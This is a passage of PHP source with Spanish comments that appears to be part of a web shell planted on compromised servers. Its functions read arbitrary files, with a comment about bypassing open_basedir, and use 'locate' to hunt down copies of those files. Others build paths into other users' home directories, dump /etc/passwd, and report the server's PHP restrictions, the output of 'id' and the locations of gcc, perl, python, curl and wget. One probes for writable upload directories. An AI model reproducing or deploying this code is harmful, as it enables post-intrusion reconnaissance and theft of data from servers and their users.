    closedir($dir);
    return $salida;
} 
function copiar_archivo($origen, $destino){
    return copy($origen,$destino) or ((($archivo=leer_archivo($rutaOrigen))!==false) and (escribir_archivo($rutaDestino,$archivo)!==false)) or shell("cp ".escapeshellarg($origen).' '.escapeshellarg($destino), FALSE);
}

//muestra el contenido de un archivo en un textbox
function mostrar_archivo($ruta,$loc = true){
    static $leidos;
    //Si hay alguna funcion especial que bypassee el open_basedir tiene que ir acá
    $ruta = realpath($ruta);
    if (filesize($ruta)<50000){
        if(strpos($leidos,"\n".$ruta."\n")==false){
            $leidos.= "\n".$ruta."\n";
            $contenido = htmlentities(leer_archivo(ltrim($ruta)), ENT_QUOTES, 'UTF-8');
            if ($contenido){
                $lineas = substr_count($contenido,"\n");
                if ($lineas>15){ $lineas = 15; }
                echo '<div class="s">'.htmlentities($ruta, ENT_QUOTES, 'UTF-8').':</div><textarea style="width:100%;" rows="'.$lineas.'">'.$contenido.'</textarea><br><br>';
            }elseif ($loc and ($loc!="''")){
                //usamos locate para encontrar mas archivos con ese nombre
                echo $ruta.'<br>';
                $locate = shell('locate '.escapeshellarg(basename($ruta)), false);
                $locate = explode("\n",$locate);
                if($locate){
                    foreach($locate as $ubicacion){
                        mostrar_archivo($ubicacion,false);
                    }
                }
            }
        }
    }else{
            echo '<div class="n" style="text-decoration: underline;">No se puede leer '.    htmlentities($ruta, ENT_QUOTES, 'UTF-8').' porque supera los 50000 bytes</div><br>';
    }
}

//generamos nombres de directorios basandonos en nombres de usuarios
function archivosdeusuarios($ruta){
    global $usuarios;
    $salida = '';
        foreach ($usuarios as $usuario){
            $nombreusuario = substr($usuario,0,strpos($usuario,':'));
            if ($nombreusuario and ($nombreusuario!= 'root')){
                $salida.='/home/'.$nombreusuario.$ruta."\n";
            }
        }
    return $salida;
}

//genera la información que sale en el div del costado
function mostrar_informacion(){
    $ruta = getcwd() or '/';
    
    if((!ini_get('safe_mode')) or (strtolower(ini_get('safe_mode'))=='off')){
        $safemode = 'No';
    }else{
        $safemode = 'Si';
    } 
    
    $salida = '<b>'.htmlentities(__FILE__, ENT_QUOTES, 'UTF-8').'</b><br><br>
    <b>Libre: '.htmlentities(decode_size(disk_free_space($ruta)), ENT_QUOTES, 'UTF-8').'</b> / <b>'.htmlentities(decode_size(disk_total_space($ruta)), ENT_QUOTES, 'UTF-8').'</b><br><br>
    <b>PHP:</b> '.htmlentities(phpversion(), ENT_QUOTES, 'UTF-8').'<br><br>
    <b>Zend:</b> '.htmlentities(zend_version(), ENT_QUOTES, 'UTF-8').'<br><br>
    <b>Safe_mode:</b> '.$safemode.'<br><br>
    <b>Funciones desactivadas:</b> '.htmlentities(ini_get('disable_functions'), ENT_QUOTES, 'UTF-8').'<br><br>
    <b>Open basedir:</b> '.htmlentities(ini_get('open_basedir'), ENT_QUOTES, 'UTF-8').'<br><br>
    <b>'.htmlentities(php_uname(), ENT_QUOTES, 'UTF-8').'</b><br><br>';
    if($id = shell('id',false)){
        $salida.= '<b>'.htmlentities($id, ENT_QUOTES, 'UTF-8').'</b><br><br>
        '.htmlentities(shell('whereis gcc',false), ENT_QUOTES, 'UTF-8').'<br><br>
        '.htmlentities(shell('whereis perl',false), ENT_QUOTES, 'UTF-8').'<br><br>
        '.htmlentities(shell('whereis python',false), ENT_QUOTES, 'UTF-8').'<br><br>
        '.htmlentities(shell('whereis curl',false), ENT_QUOTES, 'UTF-8').'<br><br>
        '.htmlentities(shell('whereis wget',false), ENT_QUOTES, 'UTF-8').'<br><br>
        <br>
        ';
    }
    if($usuarios = leer_archivo('/etc/passwd')){
        $salida.= '<b>/etc/passwd:</b><br>
            <textarea style="width:100%;" rows="10">'.$usuarios.'</textarea><br><br>';
    }
    return $salida;

}

function directorio_escribible(){
    $dirs[] = '.';
    $dirs[] = './tmp/';
    $dirs[] = './cache/';
    $dirs[] = './temp/';
    $dirs[] = './img/';
    $dirs[] = './imagenes/';
    $dirs[] = './images/';
    $dirs[] = './files/';
    $dirs[] = './upload/';
    $dirs[] = './uploads/';
    //agregamos todo lo de arriba pero en ..
    foreach ($dirs as $dir){
        $temp_array[] = $dir;
        $temp_array[] = '.'.$dir;
    }
    $dirs = $temp_array;
    $dirs[] = sys_get_temp_dir();

    foreach ($dirs as $dir) {
        if (is_writable($dir)) {
           return $dir; 
        }
    }
}    
?>